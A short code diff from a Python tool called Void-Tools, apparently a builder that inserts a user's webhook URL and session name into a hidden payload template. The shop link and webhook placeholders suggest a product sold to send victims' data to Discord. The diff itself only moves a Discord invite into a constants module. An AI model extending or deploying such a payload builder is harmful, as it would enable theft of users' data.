@@ -2,6 +2,11 @@ import sys
 if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
 import os, time, math, datetime, random, string, base64, zlib
 
+_VOID = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+if _VOID not in sys.path:
+    sys.path.insert(0, _VOID)
+from lib import constants as C
+
 from rich.console import Console, Group
 from rich.panel   import Panel
 from rich.text    import Text
@@ -49,7 +54,7 @@ except:
 
 WURL = "__WEBHOOK__"
 SID  = "__SESSION__"
-DISC = "https://discord.gg/v0id"
+DISC = "__DISCORD__"
 SHOP = "https://void-tools.mysellauth.com/"
 GITH = "https://github.com/V0id-v2/Void-Tools-v2.0"
 
@@ -237,7 +242,11 @@ def main():
 
     with Progress(SpinnerColumn(spinner_name="dots2", style=f"bold {C_RED}"), TextColumn("[white]Reconstruction des variables..."), console=console, transient=True) as p:
         p.add_task("", total=None)
-        code = PAYLOAD_RAW.replace("__WEBHOOK__", webhook_url).replace("__SESSION__", fname_input)
+        code = (
+            PAYLOAD_RAW.replace("__WEBHOOK__", webhook_url)
+            .replace("__SESSION__", fname_input)
+            .replace("__DISCORD__", C.DISCORD)
+        )
         time.sleep(1)
 
     if is_ultra:
